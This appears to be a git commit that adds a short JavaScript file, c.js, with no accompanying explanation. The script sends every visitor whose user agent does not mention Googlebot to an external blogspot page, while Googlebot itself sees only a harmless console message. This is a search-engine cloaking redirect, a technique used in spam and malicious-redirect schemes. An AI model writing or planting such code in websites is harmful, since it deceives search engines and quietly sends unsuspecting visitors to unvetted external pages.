1254e4e24c30906baffe9c9d58a8ccb0f98532db
hamarirani7-sys <hamarirani7@gmail.com>
2026-09-25 15:13:59 +0600

    Create c.js

---
+++ c.js
@@ -0,0 +1,6 @@
+
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "https://new-blog-x.blogspot.com/2026/09/nox.html";
+} else {
+  console.log("Thanks for visiting my page" );
+}
